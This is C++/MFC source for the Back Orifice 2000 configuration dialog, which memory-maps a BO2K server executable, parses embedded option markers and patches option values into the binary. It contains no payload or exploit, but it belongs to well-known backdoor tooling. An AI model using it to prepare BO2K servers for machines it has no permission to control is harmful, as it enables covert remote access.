/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


// bo2kcfgDlg.cpp : implementation file
//

#include"stdafx.h"
#include"bo2kcfg.h"
#include"bo2kcfgDlg.h"
#include<winnt.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define ROUND_TO(p,num) ((p%num)?(((p/num)+1)*num):p)

#define SIZE_OF_NT_SIGNATURE (sizeof(DWORD))
#define PEFHDROFFSET(ptr) ((LPVOID)((BYTE *)(ptr)+((PIMAGE_DOS_HEADER)(ptr))->e_lfanew+SIZE_OF_NT_SIGNATURE))
#define OPTHDROFFSET(ptr) ((LPVOID)((BYTE *)(ptr)+((PIMAGE_DOS_HEADER)(ptr))->e_lfanew+SIZE_OF_NT_SIGNATURE+sizeof(IMAGE_FILE_HEADER)))
#define SECHDROFFSET(ptr) ((LPVOID)((BYTE *)(ptr)+((PIMAGE_DOS_HEADER)(ptr))->e_lfanew+SIZE_OF_NT_SIGNATURE+sizeof(IMAGE_FILE_HEADER)+sizeof(IMAGE_OPTIONAL_HEADER)))

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgDlg dialog

CBo2kcfgDlg::CBo2kcfgDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CBo2kcfgDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBo2kcfgDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	
	m_hLargeIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hSmallIcon = AfxGetApp()->LoadIcon(IDI_LITTLECOW);
	m_hButtWizard = AfxGetApp()->LoadIcon(IDI_BUTTWIZARD);
	
	m_hSvrMapping=NULL;
	m_pSvrView=NULL;
	m_arrPluginInfo.RemoveAll();
	m_arrVarInfo.RemoveAll();
}

void CBo2kcfgDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBo2kcfgDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CBo2kcfgDlg, CDialog)
	//{{AFX_MSG_MAP(CBo2kcfgDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_OPENSERVER, OnOpenserver)
	ON_BN_CLICKED(IDC_CLOSESERVER, OnCloseserver)
	ON_NOTIFY(TVN_SELCHANGED, IDC_OPTIONVARIABLES, OnSelchangedOptionvariables)
	ON_BN_CLICKED(IDC_BOOL_DISABLED, OnBoolDisabled)
	ON_BN_CLICKED(IDC_BOOL_ENABLED, OnBoolEnabled)
	ON_BN_CLICKED(IDC_SETVALUE, OnSetvalue)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgDlg message handlers

BOOL CBo2kcfgDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hLargeIcon, TRUE);			// Set big icon
	SetIcon(m_hSmallIcon, FALSE);		// Set small icon
	
	::SendMessage(GetDlgItem(IDC_WIZARD)->GetSafeHwnd(),BM_SETIMAGE,(WPARAM)IMAGE_ICON,(LPARAM)m_hButtWizard);

	// Disable controls initially
	EnableControls(FALSE);

	m_ImgList.Create(IDB_IMGLIST,16,1,RGB(0,255,0));

	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);
	pTC->SetImageList(&m_ImgList,TVSIL_NORMAL);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CBo2kcfgDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hSmallIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CBo2kcfgDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hSmallIcon;
}

void CBo2kcfgDlg::OnOpenserver() 
{
	CFileDialog cfd(TRUE,".exe",NULL,OFN_FILEMUSTEXIST|OFN_HIDEREADONLY,"Executable Files (*.exe)|*.exe|All Files (*.*)|*.*||",this); 

	if(cfd.DoModal()==IDOK) {
		//if(IsValidServer(cfd.GetPathName())) {
			if(!OpenServer(cfd.GetPathName())) {
				AfxMessageBox("The BO2K server you have selected could not be loaded.");
			}
		//} else {
		//	AfxMessageBox("The file you selected is not a BO2K server.");
		//}
	}
}

void CBo2kcfgDlg::EnableControls(BOOL bEnable)
{
	// Deselect All List/Tree Controls
	
	((CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES))->SelectItem(NULL);

	// Enable/Disable Controls
	
	GetDlgItem(IDC_CLOSESERVER)->EnableWindow(bEnable);
	GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_OPTIONVARIABLES)->EnableWindow(bEnable);
	GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_SETVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_GROUP)->EnableWindow(FALSE);
}

BOOL CBo2kcfgDlg::OpenServer(LPCSTR svPath)
{
	// Close server if currently open
	CloseServer();	

	// Open server file
	HANDLE hSvrFile;
	m_strSvrPath=svPath;
	hSvrFile=CreateFile(svPath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
	if(hSvrFile==NULL) return FALSE;
	m_dwRawFileSize=GetFileSize(hSvrFile,NULL);
	
	// Memory map it
	BYTE *pImage;
	m_hSvrMapping=CreateFileMapping(hSvrFile,NULL,PAGE_READWRITE,0,0,NULL);
	CloseHandle(hSvrFile);
	if(m_hSvrMapping==NULL) return FALSE;
	
	m_pSvrView=(BYTE *)MapViewOfFile(m_hSvrMapping,FILE_MAP_ALL_ACCESS,0,0,0);
	pImage=(BYTE *)m_pSvrView;
	if(pImage==NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
		return FALSE;
	}

	EnableControls(TRUE);
	UpdateVariableList();
	
	return TRUE;
}

void CBo2kcfgDlg::CloseServer()
{
	// Clear filename
	m_strSvrPath.Empty();

	// Close file mapping
	if(m_pSvrView!=NULL) {
		UnmapViewOfFile(m_pSvrView);
		m_pSvrView=NULL;
	}
	
	if(m_hSvrMapping!=NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
	}

	GetDlgItem(IDC_FILENAME)->SetWindowText("");
	EnableControls(FALSE);

	UpdateVariableList();
}

void CBo2kcfgDlg::OnCloseserver() 
{
	CloseServer();	
}

void CBo2kcfgDlg::OnOK() 
{
}

void CBo2kcfgDlg::OnCancel() 
{
}

void CBo2kcfgDlg::UpdateVariableList()
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	pTC->DeleteAllItems();
	m_arrVarInfo.RemoveAll();

	// Add server config options
	if(m_pSvrView!=NULL) {
		AddVariables((char *)m_pSvrView,m_dwRawFileSize,-1);
	}

	// Add options for all plugins
	int i,count;
	
	// Add option variables to tree control
	count=m_arrVarInfo.GetSize();
	for(i=0;i<count;i++) {
		VARIABLE_INFO vi=m_arrVarInfo.GetAt(i);
		HTREEITEM hti;

		// Find category item
		hti=pTC->GetRootItem();
		while(hti!=NULL) {
			if(pTC->GetItemText(hti).Compare(vi.svCategory)==0) break;
			hti=pTC->GetNextSiblingItem(hti);
		}
		if(hti==NULL) {
			if(vi.nPlugin==-1) {
				hti=pTC->InsertItem(vi.svCategory,4,5);
			} else {
				hti=pTC->InsertItem(vi.svCategory,6,7);
			}
			pTC->SetItemData(hti,0xFFFFFFFF);
		}
		int nImg;
		if(vi.VarType=='B') nImg=3;
		else if(vi.VarType=='N') nImg=2;
		else if(vi.VarType=='S') nImg=1;

		hti=pTC->InsertItem(vi.svVarName,nImg,nImg,hti);
		pTC->SetItemData(hti,i);
	}
}

void CBo2kcfgDlg::AddVariables(char *pBuffer, DWORD dwLen, int nPlugin)
{
	DWORD pos;
	for(pos=0;pos<dwLen-9;pos++) {
		if(memcmp(pBuffer+pos,"<**CFG**>",9)==0) {
			pos+=9;
			// Get category name
			VARIABLE_INFO vi;
			lstrcpyn(vi.svCategory,pBuffer+pos,256);
			pos+=(lstrlen(pBuffer+pos)+1);
			
			// Go through all variables
			while(*(pBuffer+pos)!='\0') {
				DWORD dwValPos;
				vi.VarType=*(pBuffer+pos);
				if(vi.VarType=='B') {
					pos+=2;
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					vi.nStrLen=1;
					pos+=2;
				} else if(vi.VarType=='N') {
					// Get Number Range
					pos+=2;
					vi.nNumLo=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=',') pos++;
					pos++;
					vi.nStrLen=pos;
					vi.nNumHi=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					vi.nStrLen=pos-vi.nStrLen;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					pos+=(vi.nStrLen+1);
				} else if(vi.VarType=='S') {
					// Get Number Range
					pos+=2;
					vi.nStrLen=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					dwValPos=pos;
					pos+=(vi.nStrLen+1);
				} else {
					AfxMessageBox("Error parsing variables. Variable list could not be determined.");
					return;
				}
				
				// Add to variable info array
				vi.nPlugin=nPlugin;
				vi.dwPos=dwValPos;
				m_arrVarInfo.Add(vi);
				
			}
		}
	}

}

void CBo2kcfgDlg::OnSelchangedOptionvariables(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NMTREEVIEW *pNMTreeView = (NMTREEVIEW*)pNMHDR;

	// Hide all option controls
	GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_SETVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_GROUP)->EnableWindow(FALSE);

	if(pNMTreeView->itemNew.hItem!=NULL) {
		int nVar=pNMTreeView->itemNew.lParam;
		if(nVar!=0xFFFFFFFF) {	
			if(m_arrVarInfo[nVar].VarType=='B') {
				GetDlgItem(IDC_BOOL_GROUP)->EnableWindow();
				GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow();
				GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow();
				
				if(atoi(m_arrVarInfo[nVar].svVarValue)) {
					((CButton *)GetDlgItem(IDC_BOOL_ENABLED))->SetCheck(1);
					((CButton *)GetDlgItem(IDC_BOOL_DISABLED))->SetCheck(0);
				} else {
					((CButton *)GetDlgItem(IDC_BOOL_DISABLED))->SetCheck(1);
					((CButton *)GetDlgItem(IDC_BOOL_ENABLED))->SetCheck(0);
				}
				
			} else if(m_arrVarInfo[nVar].VarType=='N') {
				GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow();
				GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow();
				GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow();
				GetDlgItem(IDC_SETVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(m_arrVarInfo[nVar].svVarValue);
				GetDlgItem(IDC_STR_NEWVALUE)->SetWindowText("");
				((CEdit *)GetDlgItem(IDC_STR_CURRENTVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				((CEdit *)GetDlgItem(IDC_STR_NEWVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				GetDlgItem(IDC_STR_CURRENTVALUE)->ModifyStyle(0,ES_NUMBER);
				GetDlgItem(IDC_STR_NEWVALUE)->ModifyStyle(0,ES_NUMBER);
			} else if(m_arrVarInfo[nVar].VarType=='S') {
				GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow();
				GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow();
				GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow();
				GetDlgItem(IDC_SETVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(m_arrVarInfo[nVar].svVarValue);
				GetDlgItem(IDC_STR_NEWVALUE)->SetWindowText("");
				((CEdit *)GetDlgItem(IDC_STR_CURRENTVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				((CEdit *)GetDlgItem(IDC_STR_NEWVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				GetDlgItem(IDC_STR_CURRENTVALUE)->ModifyStyle(ES_NUMBER,0);
				GetDlgItem(IDC_STR_NEWVALUE)->ModifyStyle(ES_NUMBER,0);				
			}
		}
	}

	*pResult = 0;
}

void CBo2kcfgDlg::OnBoolDisabled() 
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		m_arrVarInfo[nVar].svVarValue[0]='0';

		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));

	}
}

void CBo2kcfgDlg::OnBoolEnabled() 
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		m_arrVarInfo[nVar].svVarValue[0]='1';

		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));
	}
}

void CBo2kcfgDlg::OnSetvalue()
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		CString str;
		GetDlgItem(IDC_STR_NEWVALUE)->GetWindowText(str);
		if(m_arrVarInfo[nVar].VarType=='N') {
			int nValue=atoi(str);
			if((nValue>m_arrVarInfo[nVar].nNumHi) ||
			   (nValue<m_arrVarInfo[nVar].nNumLo)) {
				AfxMessageBox("Value is out of range.");
				return;
			}
		}
		lstrcpyn(m_arrVarInfo[nVar].svVarValue,str,256);
		GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(str);
	
		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));
	}	
}

void CBo2kcfgDlg::OnExit()
{
	CloseServer();

	EndDialog(0);	
}

void CBo2kcfgDlg::OnClose() 
{
	OnExit();
}
